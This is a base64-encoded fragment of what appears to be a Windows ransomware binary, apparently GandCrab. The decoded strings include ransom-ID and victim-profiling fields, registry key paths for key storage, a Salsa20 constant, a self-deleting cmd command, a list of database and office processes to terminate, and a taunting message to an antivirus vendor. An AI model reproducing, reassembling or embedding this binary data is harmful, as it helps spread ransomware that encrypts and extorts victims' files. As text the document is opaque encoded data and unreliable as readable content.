UAbAAtAEcAUgAAAGYAaQAtAEYASQAAAGYAcgAtAEYAUgAAAGgAZQAtAEkATAAAAGgAdQAtAEgAVQAAAGkAcwAtAEkAUwAAAGkAdAAtAEkAVAAAAG4AbAAtAE4ATAAAAG4AYgAtAE4ATwAAAHAAbAAtAFAATAAAAHAAdAAtAEIAUgAAAHIAbwAtAFIATwAAAHIAdQAtAFIAVQAAAGgAcgAtAEgAUgAAAHMAawAtAFMASwAAAHMAcQAtAEEATAAAAHMAdgAtAFMARQAAAHQAaAAtAFQASAAAAHQAcgAtAFQAUgAAAHUAcgAtAFAASwAAAGkAZAAtAEkARAAAAHUAawAtAFUAQQAAAGIAZQAtAEIAWQAAAHMAbAAtAFMASQAAAGUAdAAtAEUARQAAAGwAdgAtAEwAVgAAAGwAdAAtAEwAVAAAAGYAYQAtAEkAUgAAAHYAaQAtAFYATgAAAGgAeQAtAEEATQAAAGEAegAtAEEAWgAtAEwAYQB0AG4AAAAAAGUAdQAtAEUAUwAAAG0AawAtAE0ASwAAAHQAbgAtAFoAQQAAAHgAaAAtAFoAQQAAAHoAdQAtAFoAQQAAAGEAZgAtAFoAQQAAAGsAYQAtAEcARQAAAGYAbwAtAEYATwAAAGgAaQAtAEkATgAAAG0AdAAtAE0AVAAAAHMAZQAtAE4ATwAAAG0AcwAtAE0AWQAAAGsAawAtAEsAWgAAAGsAeQAtAEsARwAAAHMAdwAtAEsARQAAAHUAegAtAFUAWgAtAEwAYQB0AG4AAAAAAHQAdAAtAFIAVQAAAGIAbgAtAEkATgAAAHAAYQAtAEkATgAAAGcAdQAtAEkATgAAAHQAYQAtAEkATgAAAHQAZQAtAEkATgAAAGsAbgAtAEkATgAAAG0AbAAtAEkATgAAAG0AcgAtAEkATgAAAHMAYQAtAEkATgAAAG0AbgAtAE0ATgAAAGMAeQAtAEcAQgAAAGcAbAAtAEUAUwAAAGsAbwBrAC0ASQBOAAAAAABzAHkAcgAtAFMAWQAAAAAAZABpAHYALQBNAFYAAAAAAHEAdQB6AC0AQgBPAAAAAABuAHMALQBaAEEAAABtAGkALQBOAFoAAABhAHIALQBJAFEAAABkAGUALQBDAEgAAABlAG4ALQBHAEIAAABlAHMALQBNAFgAAABmAHIALQBCAEUAAABpAHQALQBDAEgAAABuAGwALQBCAEUAAABuAG4ALQBOAE8AAABwAHQALQBQAFQAAABzAHIALQBTAFAALQBMAGEAdABuAAAAAABzAHYALQBGAEkAAABhAHoALQBBAFoALQBDAHkAcgBsAAAAAABzAGUALQBTAEUAAABtAHMALQBCAE4AAAB1AHoALQBVAFoALQBDAHkAcgBsAAAAAABxAHUAegAtAEUAQwAAAAAAYQByAC0ARQBHAAAAegBoAC0ASABLAAAAZABlAC0AQQBUAAAAZQBuAC0AQQBVAAAAZQBzAC0ARQBTAAAAZgByAC0AQwBBAAAAcwByAC0AUwBQAC0AQwB5AHIAbAAAAAAAcwBlAC0ARgBJAAAAcQB1AHoALQBQAEUAAAAAAGEAcgAtAEwAWQAAAHoAaAAtAFMARwAAAGQAZQAtAEwAVQAAAGUAbgAtAEMAQQAAAGUAcwAtAEcAVAAAAGYAcgAtAEMASAAAAGgAcgAtAEIAQQAAAHMAbQBqAC0ATgBPAAAAAABhAHIALQBEAFoAAAB6AGgALQBNAE8AAABkAGUALQBMAEkAAABlAG4ALQBOAFoAAABlAHMALQBDAFIAAABmAHIALQBMAFUAAABiAHMALQBCAEEALQBMAGEAdABuAAAAAABzAG0AagAtAFMARQAAAAAAYQByAC0ATQBBAAAAZQBuAC0ASQBFAAAAZQBzAC0AUABBAAAAZgByAC0ATQBDAAAAcwByAC0AQgBBAC0ATABhAHQAbgAAAAAAcwBtAGEALQBOAE8AAAAAAGEAcgAtAFQATgAAAGUAbgAtAFoAQQAAAGUAcwAtAEQATwAAAHMAcgAtAEIAQQAtAEMAeQByAGwAAAAAAHMAbQBhAC0AUwBFAAAAAABhAHIALQBPAE0AAABlAG4ALQBKAE0AAABlAHMALQBWAEUAAABzAG0AcwAtAEYASQAAAAAAYQByAC0AWQBFAAAAZQBuAC0AQwBCAAAAZQBzAC0AQwBPAAAAcwBtAG4ALQBGAEkAAAAAAGEAcgAtAFMAWQAAAGUAbgAtAEIAWgAAAGUAcwAtAFAARQAAAGEAcgAtAEoATwAAAGUAbgAtAFQAVAAAAGUAcwAtAEEAUgAAAGEAcgAtAEwAQgAAAGUAbgAtAFoAVwAAAGUAcwAtAEUAQwAAAGEAcgAtAEsAVwAAAGUAbgAtAFAASAAAAGUAcwAtAEMATAAAAGEAcgAtAEEARQAAAGUAcwAtAFUAWQAAAGEAcgAtAEIASAAAAGUAcwAtAFAAWQAAAGEAcgAtAFEAQQAAAGUAcwAtAEIATwAAAGUAcwAtAFMAVgAAAGUAcwAtAEgATgAAAGUAcwAtAE4ASQAAAGUAcwAtAFAAUgAAAHoAaAAtAEMASABUAAAAAABzAHIAAAAAAGEAZgAtAHoAYQAAAGEAcgAtAGEAZQAAAGEAcgAtAGIAaAAAAGEAcgAtAGQAegAAAGEAcgAtAGUAZwAAAGEAcgAtAGkAcQAAAGEAcgAtAGoAbwAAAGEAcgAtAGsAdwAAAGEAcgAtAGwAYgAAAGEAcgAtAGwAeQAAAGEAcgAtAG0AYQAAAGEAcgAtAG8AbQAAAGEAcgAtAHEAYQAAAGEAcgAtAHMAYQAAAGEAcgAtAHMAeQAAAGEAcgAtAHQAbgAAAGEAcgAtAHkAZQAAAGEAegAtAGEAegAtAGMAeQByAGwAAAAAAGEAegAtAGEAegAtAGwAYQB0AG4AAAAAAGIAZQAtAGIAeQAAAGIAZwAtAGIAZwAAAGIAbgAtAGkAbgAAAGIAcwAtAGIAYQAtAGwAYQB0AG4AAAAAAGMAYQAtAGUAcwAAAGMAcwAtAGMAegAAAGMAeQAtAGcAYgAAAGQAYQAtAGQAawAAAGQAZQAtAGEAdAAAAGQAZQAtAGMAaAAAAGQAZQAtAGQAZQAAAGQAZQAtAGwAaQAAAGQAZQAtAGwAdQAAAGQAaQB2AC0AbQB2AAAAAABlAGwALQBnAHIAAABlAG4ALQBhAHUAAABlAG4ALQBiAHoAAABlAG4ALQBjAGEAAABlAG4ALQBjAGIAAABlAG4ALQBnAGIAAABlAG4ALQBpAGUAAABlAG4ALQBqAG0AAABlAG4ALQBuAHoAAABlAG4ALQBwAGgAAABlAG4ALQB0AHQAAABlAG4ALQB1AHMAAABlAG4ALQB6AGEAAABlAG4ALQB6AHcAAABlAHMALQBhAHIAAABlAHMALQBiAG8AAABlAHMALQBjAGwAAABlAHMALQBjAG8AAABlAHMALQBjAHIAAABlAHMALQBkAG8AAABlAHMALQBlAGMAAABlAHMALQBlAHMAAABlAHMALQBnAHQAAABlAHMALQBoAG4AAABlAHMALQBtAHgAAABlAHMALQBuAGkAAABlAHMALQBwAGEAAABlAHMALQBwAGUAAABlAHMALQBwAHIAAABlAHMALQBwAHkAAABlAHMALQBzAHYAAABlAHMALQB1AHkAAABlAHMALQB2AGUAAABlAHQALQBlAGUAAABlAHUALQBlAHMAAABmAGEALQBpAHIAAABmAGkALQBmAGkAAABmAG8ALQBmAG8AAABmAHIALQBiAGUAAABmAHIALQBjAGEAAABmAHIALQBjAGgAAABmAHIALQBmAHIAAABmAHIALQBsAHUAAABmAHIALQBtAGMAAABnAGwALQBlAHMAAABnAHUALQBpAG4AAABoAGUALQBpAGwAAABoAGkALQBpAG4AAABoAHIALQBiAGEAAABoAHIALQBoAHIAAABoAHUALQBoAHUAAABoAHkALQBhAG0AAABpAGQALQBpAGQAAABpAHMALQBpAHMAAABpAHQALQBjAGgAAABpAHQALQBpAHQAAABqAGEALQBqAHAAAABrAGEALQBnAGUAAABrAGsALQBrAHoAAABrAG4ALQBpAG4AAABrAG8AawAtAGkAbgAAAAAAawBvAC0AawByAAAAawB5AC0AawBnAAAAbAB0AC0AbAB0AAAAbAB2AC0AbAB2AAAAbQBpAC0AbgB6AAAAbQBrAC0AbQBrAAAAbQBsAC0AaQBuAAAAbQBuAC0AbQBuAAAAbQByAC0AaQBuAAAAbQBzAC0AYgBuAAAAbQBzAC0AbQB5AAAAbQB0AC0AbQB0AAAAbgBiAC0AbgBvAAAAbgBsAC0AYgBlAAAAbgBsAC0AbgBsAAAAbgBuAC0AbgBvAAAAbgBzAC0AegBhAAAAcABhAC0AaQBuAAAAcABsAC0AcABsAAAAcAB0AC0AYgByAAAAcAB0AC0AcAB0AAAAcQB1AHoALQBiAG8AAAAAAHEAdQB6AC0AZQBjAAAAAABxAHUAegAtAHAAZQAAAAAAcgBvAC0AcgBvAAAAcgB1AC0AcgB1AAAAcwBhAC0AaQBuAAAAcwBlAC0AZgBpAAAAcwBlAC0AbgBvAAAAcwBlAC0AcwBlAAAAcwBrAC0AcwBrAAAAcwBsAC0AcwBpAAAAcwBtAGEALQBuAG8AAAAAAHMAbQBhAC0AcwBlAAAAAABzAG0AagAtAG4AbwAAAAAAcwBtAGoALQBzAGUAAAAAAHMAbQBuAC0AZgBpAAAAAABzAG0AcwAtAGYAaQAAAAAAcwBxAC0AYQBsAAAAcwByAC0AYgBhAC0AYwB5AHIAbAAAAAAAcwByAC0AYgBhAC0AbABhAHQAbgAAAAAAcwByAC0AcwBwAC0AYwB5AHIAbAAAAAAAcwByAC0AcwBwAC0AbABhAHQAbgAAAAAAcwB2AC0AZgBpAAAAcwB2AC0AcwBlAAAAcwB3AC0AawBlAAAAcwB5AHIALQBzAHkAAAAAAHQAYQAtAGkAbgAAAHQAZQAtAGkAbgAAAHQAaAAtAHQAaAAAAHQAbgAtAHoAYQAAAHQAcgAtAHQAcgAAAHQAdAAtAHIAdQAAAHUAawAtAHUAYQAAAHUAcgAtAHAAawAAAHUAegAtAHUAegAtAGMAeQByAGwAAAAAAHUAegAtAHUAegAtAGwAYQB0AG4AAAAAAHYAaQAtAHYAbgAAAHgAaAAtAHoAYQAAAHoAaAAtAGMAaABzAAAAAAB6AGgALQBjAGgAdAAAAAAAegBoAC0AYwBuAAAAegBoAC0AaABrAAAAegBoAC0AbQBvAAAAegBoAC0AcwBnAAAAegBoAC0AdAB3AAAAegB1AC0AegBhAAAAAAAAAAIAAADoYAEQCAAAAEhhARAJAAAAoGEBEAoAAAD4YQEQEAAAAEBiARARAAAAmGIBEBIAAAD4YgEQEwAAAEBjARAYAAAAmGMBEBkAAAAIZAEQGgAAAFhkARAbAAAAyGQBEBwAAAA4ZQEQHgAAAIRlARAfAAAAyGUBECAAAACQZgEQIQAAAPhmARAiAAAA6GgBEHgAAABQaQEQeQAAAHBpARB6AAAAjGkBEPwAAAAIcwEQ/wAAAKhpARBSADYAMAAwADIADQAKAC0AIABmAGwAbwBhAHQAaQBuAGcAIABwAG8AaQBuAHQAIABzAHUAcABwAG8AcgB0ACAAbgBvAHQAIABsAG8AYQBkAGUAZAANAAoAAAAAAAAAAABSADYAMAAwADgADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABhAHIAZwB1AG0AZQBuAHQAcwANAAoAAAAAAAAAUgA2ADAAMAA5AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAZQBuAHYAaQByAG8AbgBtAGUAbgB0AA0ACgAAAFIANgAwADEAMAANAAoALQAgAGEAYgBvAHIAdAAoACkAIABoAGEAcwAgAGIAZQBlAG4AIABjAGEAbABsAGUAZAANAAoAAAAAAFIANgAwADEANgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAHQAaAByAGUAYQBkACAAZABhAHQAYQANAAoAAABSADYAMAAxADcADQAKAC0AIAB1AG4AZQB4AHAAZQBjAHQAZQBkACAAbQB1AGwAdABpAHQAaAByAGUAYQBkACAAbABvAGMAawAgAGUAcgByAG8AcgANAAoAAAAAAAAAAABSADYAMAAxADgADQAKAC0AIAB1AG4AZQB4AHAAZQBjAHQAZQBkACAAaABlAGEAcAAgAGUAcgByAG8AcgANAAoAAAAAAAAAAABSADYAMAAxADkADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAG8AcABlAG4AIABjAG8AbgBzAG8AbABlACAAZABlAHYAaQBjAGUADQAKAAAAAAAAAAAAUgA2ADAAMgA0AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAXwBvAG4AZQB4AGkAdAAvAGEAdABlAHgAaQB0ACAAdABhAGIAbABlAA0ACgAAAAAAAAAAAFIANgAwADIANQANAAoALQAgAHAAdQByAGUAIAB2AGkAcgB0AHUAYQBsACAAZgB1AG4AYwB0AGkAbwBuACAAYwBhAGwAbAANAAoAAAAAAAAAUgA2ADAAMgA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAcwB0AGQAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIANwANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwB3AGkAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGEAdABpAG8AbgANAAoAAAAAAAAAAABSADYAMAAyADgADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAIABoAGUAYQBwAA0ACgAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAAAAAABSADYAMAAzADEADQAKAC0AIABBAHQAdABlAG0AcAB0ACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAHQAaABlACAAQwBSAFQAIABtAG8AcgBlACAAdABoAGEAbgAgAG8AbgBjAGUALgAKAFQAaABpAHMAIABpAG4AZABpAGMAYQB0AGUAcwAgAGEAIABiAHUAZwAgAGkAbgAgAHkAbwB1AHIAIABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALgANAAoAAAAAAFIANgAwADMAMgANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGwAbwBjAGEAbABlACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAA0ACgAAAAAAUgA2ADAAMwAzAA0ACgAtACAAQQB0AHQAZQBtAHAAdAAgAHQAbwAgAHUAcwBlACAATQBTAEkATAAgAGMAbwBkAGUAIABmAHIAbwBtACAAdABoAGkAcwAgAGEAcwBzAGUAbQBiAGwAeQAgAGQAdQByAGkAbgBnACAAbgBhAHQAaQB2AGUAIABjAG8AZABlACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuACAASQB0ACAAaQBzACAAbQBvAHMAdAAgAGwAaQBrAGUAbAB5ACAAdABoAGUAIAByAGUAcwB1AGwAdAAgAG8AZgAgAGMAYQBsAGwAaQBuAGcAIABhAG4AIABNAFMASQBMAC0AYwBvAG0AcABpAGwAZQBkACAAKAAvAGMAbAByACkAIABmAHUAbgBjAHQAaQBvAG4AIABmAHIAbwBtACAAYQAgAG4AYQB0AGkAdgBlACAAYwBvAG4AcwB0AHIAdQBjAHQAbwByACAAbwByACAAZgByAG8AbQAgAEQAbABsAE0AYQBpAG4ALgANAAoAAAAAAFIANgAwADMANAANAA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4AZQB4AGUAAAAAAG0AeQBzAHEAbABkAC0AbgB0AC4AZQB4AGUAAABtAHkAcwBxAGwAZAAtAG8AcAB0AC4AZQB4AGUAAAAAAGQAYgBlAG4AZwA1ADAALgBlAHgAZQAAAHMAcQBiAGMAbwByAGUAcwBlAHIAdgBpAGMAZQAuAGUAeABlAAAAAABlAHgAYwBlAGwALgBlAHgAZQAAAGkAbgBmAG8AcABhAHQAaAAuAGUAeABlAAAAAABtAHMAYQBjAGMAZQBzAHMALgBlAHgAZQAAAAAAbQBzAHAAdQBiAC4AZQB4AGUAAABvAG4AZQBuAG8AdABlAC4AZQB4AGUAAABvAHUAdABsAG8AbwBrAC4AZQB4AGUAAABwAG8AdwBlAHIAcABuAHQALgBlAHgAZQAAAAAAcwB0AGUAYQBtAC4AZQB4AGUAAAB0AGgAZQBiAGEAdAAuAGUAeABlAAAAAAB0AGgAZQBiAGEAdAA2ADQALgBlAHgAZQAAAAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAC4AZQB4AGUAAAB2AGkAcwBpAG8ALgBlAHgAZQAAAHcAaQBuAHcAbwByAGQALgBlAHgAZQAAAHcAbwByAGQAcABhAGQALgBlAHgAZQAAAHcAcAAtAGMAbwBuAHQAZQBuAHQAAAAAAHMAdABhAHQAaQBjAAAAAABjAG8AbgB0AGUAbgB0AAAAaQBuAGMAbAB1AGQAZQBzAAAAAABkAGEAdABhAAAAAAB1AHAAbABvAGEAZABzAAAAbgBlAHcAcwAAAAAAaQBtAGEAZwBlAHMAAAAAAHAAaQBjAHQAdQByAGUAcwAAAAAAaQBtAGEAZwBlAAAAZwByAGEAcABoAGkAYwAAAGEAcwBzAGUAdABzAAAAAABwAGkAYwBzAAAAAABpAG0AZwBzAAAAAAB0AG0AcAAAAGkAbQAAAAAAZABlAAAAAABrAGEAAAAAAGsAZQAAAAAAYQBtAAAAAABlAHMAAAAAAHMAbwAAAAAAZgB1AAAAAABzAGUAAAAAAGQAYQAAAAAAaABlAAAAAAByAHUAAAAAAG0AZQAAAAAAbQBvAAAAAAB0AGgAAAAAAHoAdQAAAAAAagBwAGcAAABwAG4AZwAAAGcAaQBmAAAAYgBtAHAAAAAvAAAASABUAFQAUAAvADEALgAxAAAAAABHAEUAVAAAADMweABDAG8AbgB0AGUAbgB0AC0AVAB5AHAAZQA6ACAAbQB1AGwAdABpAHAAYQByAHQALwBmAG8AcgBtAC0AZABhAHQAYQAAAFAATwBTAFQAAAAAACUAcwAvACUAcwAvACUAcwAvACUAcwAuACUAcwAAAAAAaAB0AHQAcAA6AC8ALwAlAHMAAABqb3BvY2hsZW4AAABNAGkAYwByAG8AcwBvAGYAdAAgAEUAbgBoAGEAbgBjAGUAZAAgAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABQAHIAbwB2AGkAZABlAHIAIAB2ADEALgAwAAA